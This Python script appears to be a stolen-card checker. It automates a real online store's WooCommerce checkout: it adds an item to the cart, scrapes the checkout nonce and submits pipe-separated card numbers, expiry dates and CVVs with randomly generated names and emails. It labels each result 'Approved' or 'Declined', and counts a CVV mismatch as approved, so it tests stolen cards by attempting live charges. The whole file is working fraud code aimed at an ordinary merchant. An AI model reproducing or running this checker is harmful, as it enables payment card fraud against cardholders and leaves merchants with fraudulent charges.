import random
import re
import names
from requests import Session
from dataclasses import dataclass
import uuid
import base64
import requests
import json
import names
from bs4 import BeautifulSoup
import uuid
from fake_useragent import UserAgent
def parseX(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None 

@dataclass
class ebichazw:
    def main(self, card):
        try:
            self.card = card
            self.ccs = card.split('|')
            if self.ccs[0].startswith("4"): self.brand = "Visa"
            if self.ccs[0].startswith("3"): self.brand = "American Express"
            elif self.ccs[0].startswith("5"): self.brand = "MasterCard"
            def generar_correo():
                return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
            CorreoRand = generar_correo()

            username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
            Agent = UserAgent().random

            session = Session()
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'es-ES,es;q=0.8',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'If-Modified-Since': 'Mon, 27 Jul 2026 23:15:29 GMT',
                'Referer': 'https://transdatainc.com/shop/?orderby=price',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Sec-GPC': '1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-07-28%2003%3A52%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Ftransdatainc.com%2Fproduct-category%2Fabacus%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-07-28%2003%3A52%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Ftransdatainc.com%2Fproduct-category%2Fabacus%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; wp_woocommerce_session_c3ad6f544ac3d397915cdf0ccf7f74fd=t_a127ab20e4831ae8853158d52d9fb6%7C1785383620%7C1785297220%7C%24generic%24jAOyDESj1dDtEZ86msO25R7E7zrWLR2n15bnoDud; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F150.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D16%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftransdatainc.com%2Fproduct%2Fabacus-electrics-a6z-p-d09f-2a-dsub-watthour-meter-blue-cable-probe%2F',
            }

            response = session.get(
                'https://transdatainc.com/product/abacus-electrics-a6z-p-d09f-2a-dsub-watthour-meter-blue-cable-probe/',
                headers=headers,
            )
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'es-ES,es;q=0.8',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://transdatainc.com',
                'Referer': 'https://transdatainc.com/product/abacus-electrics-a6z-p-d09f-2a-dsub-watthour-meter-blue-cable-probe/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Sec-GPC': '1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            data = {
                'attribute_pa_cable-size-for-a6z': 'a6z-p-d09f-2a-6-foot-cable',
                'quantity': '1',
                'add-to-cart': '1075',
                'product_id': '1075',
                'variation_id': '1078',
            }

            response = session.post(
                'https://transdatainc.com/product/abacus-electrics-a6z-p-d09f-2a-dsub-watthour-meter-blue-cable-probe/',
                headers=headers,
                data=data,
            )
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'es-ES,es;q=0.8',
                'Connection': 'keep-alive',
                'Referer': 'https://transdatainc.com/product/abacus-electrics-a6z-p-d09f-2a-dsub-watthour-meter-blue-cable-probe/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Sec-GPC': '1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-07-28%2003%3A52%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Ftransdatainc.com%2Fproduct-category%2Fabacus%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-07-28%2003%3A52%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Ftransdatainc.com%2Fproduct-category%2Fabacus%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; wp_woocommerce_session_c3ad6f544ac3d397915cdf0ccf7f74fd=t_a127ab20e4831ae8853158d52d9fb6%7C1785383620%7C1785297220%7C%24generic%24jAOyDESj1dDtEZ86msO25R7E7zrWLR2n15bnoDud; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F150.0.0.0%20Safari%2F537.36; woocommerce_items_in_cart=1; woocommerce_cart_hash=9639aadbe74ad5f2446e9bdc757a0fa8; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftransdatainc.com%2Fproduct%2Fabacus-electrics-a6z-p-d09f-2a-dsub-watthour-meter-blue-cable-probe%2F',
            }

            response = session.get('https://transdatainc.com/cart/', headers=headers)
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'es-ES,es;q=0.8',
                'Connection': 'keep-alive',
                'Referer': 'https://transdatainc.com/cart/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Sec-GPC': '1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-07-28%2003%3A52%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Ftransdatainc.com%2Fproduct-category%2Fabacus%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-07-28%2003%3A52%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Ftransdatainc.com%2Fproduct-category%2Fabacus%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; wp_woocommerce_session_c3ad6f544ac3d397915cdf0ccf7f74fd=t_a127ab20e4831ae8853158d52d9fb6%7C1785383620%7C1785297220%7C%24generic%24jAOyDESj1dDtEZ86msO25R7E7zrWLR2n15bnoDud; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F150.0.0.0%20Safari%2F537.36; woocommerce_items_in_cart=1; woocommerce_cart_hash=9639aadbe74ad5f2446e9bdc757a0fa8; sbjs_session=pgs%3D19%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftransdatainc.com%2Fcart%2F',
            }

            response = session.get('https://transdatainc.com/checkout/', headers=headers).text
            chekout = parseX(response, 'name="woocommerce-process-checkout-nonce" value="', '"')
            print(chekout)
            headers = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'es-ES,es;q=0.8',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://transdatainc.com',
                'Referer': 'https://transdatainc.com/checkout/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-GPC': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-07-28%2003%3A52%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Ftransdatainc.com%2Fproduct-category%2Fabacus%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-07-28%2003%3A52%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Ftransdatainc.com%2Fproduct-category%2Fabacus%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; wp_woocommerce_session_c3ad6f544ac3d397915cdf0ccf7f74fd=t_a127ab20e4831ae8853158d52d9fb6%7C1785383620%7C1785297220%7C%24generic%24jAOyDESj1dDtEZ86msO25R7E7zrWLR2n15bnoDud; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F150.0.0.0%20Safari%2F537.36; woocommerce_items_in_cart=1; woocommerce_cart_hash=9639aadbe74ad5f2446e9bdc757a0fa8; sbjs_session=pgs%3D20%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftransdatainc.com%2Fcheckout%2F',
            }

            params = {
                'wc-ajax': 'checkout',
            }

            data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Ftransdatainc.com%2Fproduct-category%2Fabacus%2F&wc_order_attribution_session_start_time=2026-07-28+03%3A52%3A49&wc_order_attribution_session_pages=20&wc_order_attribution_session_count=2&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F150.0.0.0+Safari%2F537.36&billing_first_name=ldfl&billing_last_name=dsdasd&billing_company=ggd&billing_country=US&billing_address_1=moall+del+sol&billing_address_2=sadw&billing_city=guayas&billing_state=NY&billing_postcode=10080&billing_phone=%2B10989861371&billing_email={CorreoRand}&shipping_first_name=ldfl&shipping_last_name=dsdasd&shipping_company=ggd&shipping_country=US&shipping_address_1=moall+del+sol&shipping_address_2=sadw&shipping_city=guayas&shipping_state=NY&shipping_postcode=10080&shipping_phone=%2B10989861371&order_comments=&shipping_method%5B0%5D=free_shipping%3A7&payment_method=ebizcharge&ebizcharge-payment-method=cc&ccholder=ldfl+dsdasd&ccnum={self.ccs[0]}&cardtype={self.brand}&expmonth={self.ccs[1]}&expyear={self.ccs[2]}&cvv={self.ccs[3]}&Is3DS2Enabled=false&surcharge_enabled=&woocommerce-process-checkout-nonce={chekout}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'

            response = session.post('https://transdatainc.com/', params=params, headers=headers, data=data)
            j = response.json()

            html = j.get("messages", "")
            mensaje = BeautifulSoup(html, "html.parser").get_text(" ", strip=True)

            print(mensaje)

            if j.get("result") == "success":
                return 'Approved! ✅', 'Charged 445$'

            elif '(Transaction Error) CVV2 Declined (C2)' in mensaje:
                return 'Approved! ✅', mensaje

            else:
                return 'Declined ❌', mensaje

        except Exception as e:
            print(e)
            return 'Declined ❌', str(e)
